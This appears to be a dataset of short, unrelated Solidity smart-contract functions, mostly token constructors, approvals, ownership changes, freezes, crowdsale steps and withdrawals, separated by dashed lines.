function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function unlockTokens() internal {
    if (DemeterToken(token).unlockTime() > block.timestamp) {
      DemeterToken(token).setUnlockTime(block.timestamp);
    }
  }
--------------------------------------------------------------------------------
function BOF(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function CheckMate(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    foxfox[spender] = val;
    peterparker[spender] = val2; 
    redlight[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function _upgradeTo(address _newImplementation) internal {
        address currentImplementation = implementation();
        require(currentImplementation != _newImplementation);
        _setImplementation(_newImplementation);
        emit Upgraded(_newImplementation);
    }
--------------------------------------------------------------------------------
function beneficiarytotal(address addr) public view returns (uint256) {
    	require(_beneficiary_total[addr] != 0,'not in beneficiary list');
        return _beneficiary_total[addr];
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
constructor(address _admin) public {
    totalSupply_ = INITIAL_SUPPLY;
	balances[_admin] = INITIAL_SUPPLY;
	emit Transfer(address(0x0), _admin, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function changeOwner(string _changeOwnerPassword, address _newOwnerAddress) onlyOwner returns(bool) {
		//One-time tool for emergency owner change
		if (keccak256(_changeOwnerPassword) == 0xe17a112b6fc12fc80c9b241de72da0d27ce7e244100f3c4e9358162a11bed629) {
			owner = _newOwnerAddress;
			return true;
		}
		else 
			return false;
	}
--------------------------------------------------------------------------------
function _adjustedElapsedTime(uint256 time) private view returns(uint256) {
        uint256 elapsedTime = time.sub(lastLockedTime);
        return elapsedTime.sub(elapsedTime.mod(ONE_DAY_SECONDS));
    }
--------------------------------------------------------------------------------
function SimpleToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function transferOwnership(address payable _newAdmin) public onlyAdmin {
        require(_newAdmin != address(0), "New admin can't be null");      
        admin = _newAdmin;
    }
--------------------------------------------------------------------------------
function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal whenNotPaused {
    require(_beneficiary != address(0));
    require(block.timestamp >= openingTime && block.timestamp <= closingTime);
  }
--------------------------------------------------------------------------------
function NBW(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function tokenSaleStart() external onlyOwner tokenSaleIsNotOngoing returns(bool) {
        require(currentTokenSaleId < MAX_TOKEN_SALES);
        currentTokenSaleId++;
        tokenSaleOngoing = true;
        emit TokenSaleStarting(currentTokenSaleId);
        return true;
    }
--------------------------------------------------------------------------------
function unlockAddress(address _address) public onlyLocker returns(bool) {
        require(locked[_address]);

        locked[_address] = false;
        emit Unlock(_address);
        return true;
    }
--------------------------------------------------------------------------------
function tokenURI(uint256 _tokenId) public view returns (string) {
        require(exists(_tokenId));
        string memory infoUrl;
        infoUrl = strConcat('https://cryptoflowers.io/v/', uint2str(_tokenId));
        return infoUrl;
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
        super._mint(_to, _tokenId);

        allTokensIndex[_tokenId] = allTokens.length;
        allTokens.push(_tokenId);
    }
--------------------------------------------------------------------------------
function VUToken() public
    DetailedERC20("VU TOKEN", "VU", 18)
    {
        totalSupply_ = INITIAL_SUPPLY;

        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function PROM(
    ) public {
        totalSupply = 777000000000000000000000000;                         // Total supply with the decimal amount
        balanceOf[msg.sender] = 777000000000000000000000000;               // All initial tokens
        name = "Pro Marketer";                                             // The name for display purposes
        symbol = "PROM";                                                   // The symbol for display purposes
    }
--------------------------------------------------------------------------------
constructor(uint256 _openingTime, uint256 _closingTime) public {
        // solium-disable-next-line security/no-block-members
        require(_openingTime >= block.timestamp);
        require(_closingTime >= _openingTime);

        openingTime = _openingTime;
        closingTime = _closingTime;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function MyToken() {
        _balanceOf[msg.sender] = 4000000000000000000000;              
        _totalSupply = 4000000000000000000000;                 
        Transfer(this, msg.sender,4000000000000000000000);
    }
--------------------------------------------------------------------------------
constructor(address safeEngine_) public {
        authorizedAccounts[msg.sender] = 1;
        safeEngine = SAFEEngineLike(safeEngine_);
        emit AddAuthorization(msg.sender);
    }
--------------------------------------------------------------------------------
constructor () {
    _name = "Media Licensing Token";
    _symbol = "MLT";

    // Holds max mintable limit, 200 million tokens
    _maxTokens = 200000000000000000000000000;
    _mint(_msgSender(), _maxTokens);
  }
--------------------------------------------------------------------------------
function releaseSEcoin() public returns (bool) {
        require (msg.sender == SEcoinsetWallet);
        require (hasEnded() && startTime != 0);
        SEcoinAbstract(SEcoin).unlock();
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {
            if(!preIcoHasEnded()){
                return weiAmount.mul(preIcoRate);
            }else{
                return weiAmount.mul(icoRate);
            }
        }
--------------------------------------------------------------------------------
function () payable{
        require(msg.value >= WEI_MINIMUM_PURCHASE);
        appendEarlyPurchase(msg.sender, msg.value, block.timestamp);
    }
--------------------------------------------------------------------------------
function SPAYToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balances[owner] = _initialSupply;
    }
--------------------------------------------------------------------------------
constructor(address _logic, address admin_, bytes memory _data) payable ERC1967Proxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _changeAdmin(admin_);
    }
--------------------------------------------------------------------------------
function whitelist(address[] calldata _addr) public onlyOwner {
        for (uint256 i; i < _addr.length; i++) {
            _whitelist.push(_addr[i]);
        }
    }
--------------------------------------------------------------------------------
function ETJToken(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function _getBurnAmount(uint256 amount) internal view virtual returns (uint256) {
        if (_totalSupply<=_threshold) {
            return 0;
        }
        return amount.mul(_burnRate).div(1000);
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function confirmOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) public {
	super.transferOwnership( newOwner );
	uint256 value = balances[msg.sender];
	transfer( newOwner, value );    
  }
--------------------------------------------------------------------------------
function requestchangeAdmin(address _newAdmin) public contractActive onlyOwner returns (bool) {
        ownerTransaction[msg.sender][_newAdmin] = Multisig(multisigAddress).requestOwnerChange(owner, _newAdmin);
        return true;
    }
--------------------------------------------------------------------------------
function issueTokensExternal(address _to, uint _tokens) public onlyInState(State.ICOFinished) onlyTokenManager {
          // can not issue more than BONUS_REWARD
          require((issuedExternallyTokens + _tokens)<=BONUS_REWARD);

          mntToken.issueTokens(_to,_tokens);

          issuedExternallyTokens = issuedExternallyTokens + _tokens;
     }
--------------------------------------------------------------------------------
function kill() public onlyOwner {
    // cannot kill contract before winner is announced and it's been announced at least for 8 weeks
    require(winnerAnnounced > 0 && uint32(now) > (winnerAnnounced + 8 weeks));
    selfdestruct(msg.sender);
  }
--------------------------------------------------------------------------------
function vestingDaysLeft() public view override returns (uint256) {
        if (block.timestamp < _vestingEnd) {
            return VESTING_DURATION_DAYS
                .sub(vestingDaysSinceStart());
        } else {
            return 0;
        }
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint40 _cutieId)
        public
        view
        returns (uint128)
    {
        Auction storage auction = cutieIdToAuction[_cutieId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function endSaleCarProduct(uint32 _carProductID) public onlyMaster {
        require(_carProductID > 0 && _carProductID < newCarProductID);
        carProducts[_carProductID].sale = false;

        EventProductEndSale(_carProductID);
    }
--------------------------------------------------------------------------------
function changeBetLimits(uint minBet, uint maxBet) public
    {
        require(msg.sender == authority);
        require(maxBet >= minBet);

        minBetWei = minBet;
        maxBetWei = maxBet;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function startICO() external isActive onlyOwnerOrAdmin returns (bool) {
        saleState = IN_ICO;
        icoStartTime = now;
        isSelling = true;
        emit StartICO(saleState);
        return true;
    }
--------------------------------------------------------------------------------
function withdrawCrowdsaleDragons() onlyOwner{
        
        uint256 balance = tokenReward.balanceOf( address( this ) );
        tokenReward.transfer( msg.sender , balance );
        
        
    }
--------------------------------------------------------------------------------
function withdrawTokens(address tokenContract) external canAccess(2) {
        ERC20 tc = ERC20(tokenContract);
        tc.transfer(msg.sender, tc.balanceOf(this));
    }
--------------------------------------------------------------------------------
function advanceStep() public onlyOwner() {
        require(Step.FundingPreSale == currentStep);
        currentStep = Step.FundingPublicSale;
        minInvestETH = 1 ether/4;
    }
--------------------------------------------------------------------------------
function prepareRefund() public payable onlyOwner() {

        require(crowdsaleClosed);
        require(msg.value == ethReceivedPresale.add(ethReceivedMain)); // make sure that proper amount of ether is sent
        currentStep = Step.Refunding;
    }
--------------------------------------------------------------------------------
function tokenDrain() external onlyOwner() {
        if (block.number > endBlock) {
            require(token.transfer(multisig, token.balanceOf(this)));
        }
    }
--------------------------------------------------------------------------------
